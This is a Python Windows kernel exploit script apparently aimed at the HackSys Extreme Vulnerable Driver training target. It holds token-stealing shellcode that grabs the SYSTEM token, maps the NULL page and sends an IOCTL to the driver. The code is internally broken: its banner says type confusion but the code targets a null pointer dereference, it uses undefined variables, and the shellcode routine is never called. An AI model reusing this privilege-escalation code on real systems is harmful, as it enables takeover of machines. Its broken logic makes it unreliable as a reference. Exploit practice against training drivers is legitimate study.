import sys, os
import ctypes, struct
from ctypes import *


kernel32              = windll.kernel32
psapi                 = windll.Psapi
ntdll                 = windll.ntdll

def shellcode_payload():
    token_stealing_shellcode = (
        "\x60"                            # pushad
        "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                    # mov eax,[eax+0x50]
        "\x89\xc1"                        # mov ecx,eax
        "\xba\x04\x00\x00\x00"            # mov edx,0x4
        "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
        "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
        "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
        "\x75\xed"                        # jnz 0x1a
        "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
        "\x61"                            # popad
        "\x31\xC0"                        # NTSTATUS -> STATUS_SUCCESS
        "\x5D"                            # pop ebp
        "\xC2\x08\x00"                    # ret 8
        #cleanup
        "\x61"                            # popad
        "\xc3"                            # ret
    )

    shellcode_address = id(token_stealing_shellcode) + 20
    print("[+] Shellcode payloads address: 0x%X" %shellcode_address)
    print("[+] Stealing NT Authority\System token...")
    return shellcode_address

def memory_page_alloc():
    null_status = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(c_void_p(0x1)), 0, byref(c_ulong(0x100)), 0x3000, 0x40)
    if null_status != 0x0:
        print("[!] Failed to allocate NULL memory page")
        sys.exit(1)
    else:
        print("[+] Successfully allocated NULL memory page")

def trigger_null_pointer_dereference_bsod():
    
    device_handle = kernel32.CreateFileA("\\\\.\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

    if not device_handle or device_handle == -1:
        print("[!] Error creating Device handle:" + ctypes.GetLastError())
        sys.exit()
    else:
        print("[+] Device handler setup successful")
        print("[+] Device handle in use: HackSysExtremeVulnerableDriver")

    print("[+] Preparing the Ring0 Payload...")

    shellcode = id("\x90" * 4) + 20

    memory_page_alloc()
    
    kernel32.DeviceIoControl(device_handle, 0x22202b, buffer, bufLength, None, 0, byref(c_ulong()), None)
    print("[+] Payload sent...")


def intro_notice():
    print("\n\/\/ HEVD - Type Confusion Exploit \/\/\n")
    print("[+] Starting exploit...")
    trigger_null_pointer_dereference_bsod()

if __name__ == '__main__':
    intro_notice()
